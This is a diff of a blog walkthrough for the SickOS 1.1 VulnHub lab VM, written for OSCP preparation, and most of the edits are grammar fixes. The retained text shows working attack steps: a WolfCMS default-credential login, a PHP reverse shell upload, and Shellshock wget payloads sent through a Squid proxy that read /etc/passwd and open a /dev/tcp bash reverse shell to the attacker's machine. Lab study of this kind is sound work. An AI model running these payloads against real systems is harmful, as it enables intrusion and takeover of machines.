@@ -7,11 +7,11 @@ author: petruknisme
 comments: true
 ---
 
-SickOS is Vulnerable VM hosted by [VulnHub](https://vulnhub.com) that i tried after kioptrix from [Abatchy](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms) suggestion for OSCP like vms.
+SickOS are Vulnerable VM hosted by [VulnHub](https://vulnhub.com) that I tried after kioptrix from [Abatchy](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms) suggestion for OSCP like vms.
 
 #### Disclaimer
 
-This guide is for educational purpose only and someone looking for OSCP preparation like iam. In this series i will guiding you how to root the vm without using metasploit. 
+This guide is for educational purpose only and someone looking for OSCP preparation like I am. In this series, I will be guiding you how to root the VM without using Metasploit.
 
 VM Description:
 
@@ -37,11 +37,11 @@ Download link: https://www.vulnhub.com/entry/sickos-11,132/
 
 #### Host Discovery
 
-Because all VulnHub vm come with random DHCP ip address for the machines, we need to identifying the ip address from the vm first. In this section we can use several methods for discovering the host. 
+Because all VulnHub VM comes with random DHCP IP address for the machines, we need to identify the IP address from the VM first. In this section, we can use several methods for discovering the host. 
 
-I'm using VMware for hosting the machines, but i don't know why VMware are not showing as Vendor name in arp-scan, netdiscover or nmap. It only show as Unknown or Intel corporate. Because only 3 machine connected to wifi, it's easy to determine which one is the VM. 
+I'm using VMware for hosting the machines, but I don't know why VMware is not showing as Vendor name in arp-scan, netdiscover or nmap. It only shows as Unknown or Intel corporate. Because of only 3 machines connected to wifi, it's easy to determine which one is the VM. 
 
-Okay, try to discovering the host using 3 methods with root privilege.
+Okay, try to discover the host using 3 methods with root privilege.
 
 **Arp-Scan**
 
@@ -117,13 +117,13 @@ Network Distance: 1 hop
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-From the above results, we know that nmap tell us port 22 and 3128 is open. While port 8080 state is closed, it's so weird if open port just ssh and squid proxy. What's interesting is port 3128 for Squid Proxy. After hours of searching i get this explanation from rapid7 and from other writeup for SickOS. As [rapid7](https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning) explanation:
+From the above results, we know that nmap tell us port 22 and 3128 is open. While port 8080 state is closed, it's so weird if open port just ssh and squid proxy. What's interesting is port 3128 for Squid Proxy. After hours of searching, I get this explanation from rapid7 and from other write-up for SickOS. As [rapid7](https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning) explanation:
 
 > A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests for internal IP addresses against a misconfigured open Squid proxy exposed to the Internet, therefore performing an internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy which allows the attack to pivot to another part of the network).
 
-I don't want to use metasploit built-in `auxiliary/scanner/http/squid_pivot_scanning` for this. So i'm building my own tools(after understanding the attack flow) for checking open port behind misconfigured squid proxy. You can use my tool for this purpose, just clone and run it:
+I don't want to use metasploit built-in `auxiliary/scanner/http/squid_pivot_scanning` for this. So I'm building my own tools(after understanding the attack flow) for checking open port behind misconfigured squid proxy. You can use my tool for this purpose, just clone and run it:
 
-Spose - Squid Pivoting Open Port Scanner : http://github.com/aancw/spose
+Spose - Squid Pivoting Open Port Scanner : [http://github.com/aancw/spose](http://github.com/aancw/spose)
 
 **Scan with proxy** 
 
@@ -261,7 +261,7 @@ From the informations we get before, we can summarize the vulnerability by 2 att
 - Exploiting Machine with Shellsock
 - Finding Wolfcms Vuln
 
-As far i know, the above attack vector is resulting reverse shell for connection when success. So we can listen for incoming reverse shell connection with netcat:
+As far I know, the above attack vector is resulting reverse shell for connection when success. So we can listen for incoming reverse shell connection with netcat:
 
 ```bash
 ↳ nc -lvp 4443
@@ -270,26 +270,25 @@ Listening on [0.0.0.0] (family 0, port 4443)
 
 **WolfCMS Attack Vector**
 
-Using wolfcms as attack vector for getting root shell with wolfcms 0.8.2 vulnerability. I've found that in this version is affected by Arbitrary File Upload vuln as mentioned in [Exploit-DB](https://www.exploit-db.com/exploits/36818). But, we need valid credential/session for uploading reverse shell or backdoor for login credential. Trying to use common weak password like admin:admin, admin:password and other for the login at http://192.168.43.202/wolfcms/?/admin/login
+Using wolfcms as attack vector for getting root shell with wolfcms 0.8.2 vulnerability. I've found that in this version is affected by Arbitrary File Upload vuln as mentioned in [Exploit-DB](https://www.exploit-db.com/exploits/36818). But, we need a valid credential/session for uploading reverse shell or backdoor for login credential. Trying to use a common weak password like admin:admin, admin:password and other for the login at http://192.168.43.202/wolfcms/?/admin/login
 
 ![wolfcms-login]({{ site.url }}/img/wolfcms-login.png)
 
-Input admin:admin for the credential and then it redirecting us to administration dashboard. Good news!
+Input admin:admin for the credential and then it redirected us to administration dashboard. Good news!
 
 So, what's next?
 
-After logged in to administrator dashboard, we can upload php reverse shell in file manager feature. 
-
+After logging in to administrator dashboard, we can upload PHP reverse shell in file manager feature. 
 ![wolfcms-upload-file]({{ site.url }}/img/wolfcms-upload-file.png) 
 
-Nah, we can upload file in `public/images` directory or in `public` directory. For simple php reverse shell, you can download from [PentestMonkey.net](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the file with ip and port for reverse shell as i mentioned above.
+Nah, we can upload the file in `public/images` directory or in `public` directory. For simple php reverse shell, you can download from [PentestMonkey.net](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the file with IP and port for the reverse shell as I mentioned above.
 
 ```php
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 ```
 
-Upload the file, access it(http://192.168.43.202/wolfcms/public/reverse.php) and see incoming connection in netcat listening session:
+Upload the file, access it(http://192.168.43.202/wolfcms/public/reverse.php) and see an incoming connection in netcat listening session:
 
 ```bash
 ↳ nc -lvp 4443
@@ -303,15 +302,15 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
 
-Gotcha! We have reverse shell from our backdoor. Next, exploiting shellsock vulnerability.
+Gotcha! We have a reverse shell from our backdoor. Next, exploiting shellsock vulnerability.
 
 **Shellsock Attack Vector**
 
-We will use this attack vector for rooting the machine. If you are don't know about shellsock, you can read explanation from [coderwall](https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability)
+We will use this attack vector for rooting the machine. If you are don't know about shellsock, you can read the explanation from [coderwall](https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability)
 
 > The **Shellshock** vulnerability, also know as **CVE-2014-6271**, allows attackers to inject their own code into [Bash](http://www.gnu.org/software/bash/) using specially crafted **environment variables**
 
-From nikto scan result, we know that affected endpoint is `cgi-bin/status`. So, we need to test this by sending malicious crafted request with wget, curl or other tool. For simple Proof, we are sending request to affected endpoint with `cat /etc/passwd` for showing `/etc/passwd` content.
+From nikto scan result, we know that affected endpoint is `cgi-bin/status`. So, we need to test this by sending a malicious crafted request with wget, curl or other tools. For simple Proof, we are sending a request to the affected endpoint with `cat /etc/passwd` for showing `/etc/passwd` content.
 
 ```bash
 ↳ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
@@ -344,9 +343,9 @@ sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
 mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-Aha~ our request is accepted and it show us the content of `etc/passwd` file. 
+Aha~ our request is accepted and it shows us the content of `etc/passwd` file. 
 
-Now, we can make reverse shell connection with this vuln like php reverse shell before. Doing simple reverse shell with `/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
+Now, we can make reverse shell connection with this vuln like PHP reverse shell before. Doing simple reverse shell with `/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
 
 ```bash
 ↳ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -i >& /dev/tcp/192.168.43.94/4443 0>&1" -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
@@ -367,8 +366,7 @@ www-data@SickOs:/usr/lib/cgi-bin$
 
 **Post Exploitation**
 
-In this section, we are going to escalating privilege from www-data to root privilege because the flag in root directory as mentioned in instruction:
-
+In this section, we are going to escalating privilege from www-data to root privilege because the flag in the root directory as mentioned in instruction:
 ```
 Get /root/a0216ea4d51874464078c618298b1367.txt
 ```
@@ -504,7 +502,7 @@ define ('DELAY_FIRST_AFTER', 3);
 define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
 ```
 
-From `/etc/passwd/` we know that **sickos** user is exist in this machine. Trying to su with credential from database connection.  
+From `/etc/passwd/` we know that **sickos** user exists in this machine. Trying to su with a credential from the database connection. 
 
 ```bash
 www-data@SickOs:/usr/lib/cgi-bin$ su sickos
